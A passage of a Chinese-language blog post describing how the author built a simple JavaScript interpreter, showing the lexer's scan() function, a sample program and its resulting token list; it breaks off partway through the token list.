    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/10/11/%E7%AE%80%E5%8D%95JavaScript%E8%A7%A3%E9%87%8A%E5%99%A8/" class="post-title-link" itemprop="url">简单JavaScript解释器</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2023-10-11 13:14:33 / Modified: 13:16:58" itemprop="dateCreated datePublished" datetime="2023-10-11T13:14:33+08:00">2023-10-11</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Technology/" itemprop="url" rel="index"><span itemprop="name">Technology</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>17k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>16 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在学习了一款 JavaScript 解释器的项目过后，想自己写一个 JavaScript 解释器：<a target="_blank" rel="noopener" href="https://github.com/zuluoaaa/makeJs">zuluoaaa/makeJs: A sub Javascript interpreter for interpreting itself (github.com)</a> </p>
<p>在数据结构和分析逻辑上面很大程度参考了以上项目，不过我在原项目的基础上进行了魔改并添加了新的功能</p>
<p>PS：本项目只是简单的模拟了 JavaScript 解释器的执行过程，并没有涉及 JavaScript 的灵魂（一切皆对象）</p>
<h2 id="词法分析"><a href="#词法分析" class="headerlink" title="词法分析"></a>词法分析</h2><p><strong>词法分析核心实现</strong></p>
<p>词法分析其实就是一个线性扫描加上正则匹配的过程，核心函数如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">scan</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    skipBlank();</span><br><span class="line">    <span class="keyword">let</span> &#123;</span><br><span class="line">        content,</span><br><span class="line">        index,</span><br><span class="line">        token,</span><br><span class="line">        tokenBack</span><br><span class="line">    &#125; = gData;</span><br><span class="line">    token.value = <span class="literal">null</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(tokenBack !== <span class="literal">null</span>)&#123;</span><br><span class="line">        <span class="keyword">let</span> token = tokenBack;</span><br><span class="line">        gData.tokenBack = <span class="literal">null</span>;</span><br><span class="line">        gData.token.type = token.type;</span><br><span class="line">        gData.token.value = token.value;</span><br><span class="line">        <span class="keyword">return</span> token;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(index &gt;= content.length)&#123;</span><br><span class="line">        token.type = tokenTypes.T_EOF;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> value = nextChar();</span><br><span class="line">    <span class="keyword">let</span> next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (value) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;+&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_ADD;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;-&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_SUB;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;*&quot;</span>:</span><br><span class="line">            next = nextChar();</span><br><span class="line">            <span class="keyword">if</span>(next === <span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">                token.type = tokenTypes.T_RCMT;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                putBack(next);</span><br><span class="line">                token.type = tokenTypes.T_MUL;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;/&quot;</span>:</span><br><span class="line">            next = nextChar();</span><br><span class="line">            <span class="keyword">if</span>(next === <span class="string">&quot;*&quot;</span>)&#123;</span><br><span class="line">                token.type = tokenTypes.T_LCMT;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(next === <span class="string">&quot;/&quot;</span>)&#123;</span><br><span class="line">                token.type = tokenTypes.T_LINE_CMT;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                putBack(next);</span><br><span class="line">                token.type = tokenTypes.T_DIV;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;,&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_COMMA;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;=&quot;</span>:</span><br><span class="line">            next = nextChar();</span><br><span class="line">            <span class="keyword">if</span>(next === <span class="string">&quot;=&quot;</span>)&#123;</span><br><span class="line">                token.type = tokenTypes.T_EQ;</span><br><span class="line">                next = nextChar();</span><br><span class="line">                <span class="keyword">if</span>(next !== <span class="string">&quot;=&quot;</span>)&#123;</span><br><span class="line">                    putBack(next);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                token.type = tokenTypes.T_ASSIGN;</span><br><span class="line">                putBack(next);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;;&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_SEMI;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;!&quot;</span>:</span><br><span class="line">            next = nextChar();</span><br><span class="line">            <span class="keyword">if</span>(next === <span class="string">&quot;=&quot;</span>)&#123;</span><br><span class="line">                token.type = tokenTypes.T_NEQ;</span><br><span class="line">            &#125;</span><br><span class="line">            putBack(next);</span><br><span class="line">            token.type = tokenTypes.T_NOT;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;&gt;&quot;</span>:</span><br><span class="line">             next = nextChar();</span><br><span class="line">            <span class="keyword">if</span>(next === <span class="string">&quot;=&quot;</span>)&#123;</span><br><span class="line">                token.type = tokenTypes.T_GE;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                token.type = tokenTypes.T_GT;</span><br><span class="line">                putBack(next);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;&lt;&quot;</span>:</span><br><span class="line">             next = nextChar();</span><br><span class="line">            <span class="keyword">if</span>(next === <span class="string">&quot;=&quot;</span>)&#123;</span><br><span class="line">                token.type = tokenTypes.T_LE;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                token.type = tokenTypes.T_LT;</span><br><span class="line">                putBack(next);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;&amp;&quot;</span>:</span><br><span class="line">            next = nextChar();</span><br><span class="line">            <span class="keyword">if</span>(next === <span class="string">&quot;&amp;&quot;</span>)&#123;</span><br><span class="line">                token.type = tokenTypes.T_AND;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                putBack(next);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;|&quot;</span>:</span><br><span class="line">            next = nextChar();</span><br><span class="line">            <span class="keyword">if</span>(next === <span class="string">&quot;|&quot;</span>)&#123;</span><br><span class="line">                token.type = tokenTypes.T_OR;</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                putBack(next);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;(&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_LPT;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;)&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_RPT;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;&#123;&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_LBR;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_RBR;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;[&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_LMBR;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;]&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_RMBR;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;?&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_QST;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;:&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_COL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;\&quot;&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_STRING;</span><br><span class="line">            token.value = scanStr(<span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;\&#x27;&quot;</span>:</span><br><span class="line">            token.type = tokenTypes.T_STRING;</span><br><span class="line">            token.value = scanStr(<span class="string">&quot;\&#x27;&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">if</span>(regNumber(value))&#123;</span><br><span class="line">                token.value = scanInt(value);</span><br><span class="line">                token.type = tokenTypes.T_INT;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(regVar(value))&#123;</span><br><span class="line">                value = scanIdent(value);</span><br><span class="line">                token.type = scanKeyword(value);</span><br><span class="line">                token.value = value;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            printErr(<span class="string">`Unrecognised char : (<span class="subst">$&#123;value&#125;</span>)`</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">if</span>(token.type === tokenTypes.T_LINE_CMT)&#123;</span><br><span class="line">        skipOneLine();</span><br><span class="line">        scan();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>一些简单的符号可以直接匹配，而字符串和数字则需要借助正则表达式</li>
</ul>
<p>次步骤会将程序简单转化为 token 流，并记录于 <code>lexList</code> 列表中：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">var</span> c;</span><br><span class="line"><span class="keyword">if</span>(a &gt; b)&#123;</span><br><span class="line">    c = add(a,b) * add(a,b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    c = add(a,b) + add(a,b);</span><br><span class="line">&#125;</span><br><span class="line">log(c);</span><br></pre></td></tr></table></figure>
<ul>
<li>此时 token 就只是标识符，按照顺序排布，没有任何语法上的含义</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;function&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;function&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;add&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;(&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;,&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;)&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;return&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;return&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;+&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;&#125;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;var&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;var&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;=&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;number&#x27;</span>, <span class="attr">value</span>: <span class="number">1</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;var&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;var&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;=&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;number&#x27;</span>, <span class="attr">value</span>: <span class="number">2</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;var&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;var&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;c&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;if&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;if&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;(&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;&gt;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;)&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;c&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;=&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;add&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;(&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;,&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;)&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;*&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;add&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;(&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;,&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;)&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;&#125;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;else&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;else&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;c&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;=&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;add&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;(&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;,&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;)&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;+&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;add&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;(&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;a&#x27;</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;,&#x27;</span>, <span class="attr">value</span>: <span class="literal">null</span> &#125;,</span><br><span class="line">  Token &#123; <span class="attr">type</span>: <span class="string">&#x27;identifier&#x27;</span>, <span class="attr">value</span>: <span class="string">&#x27;b&#x27;</span> &#125;,</span><br><span 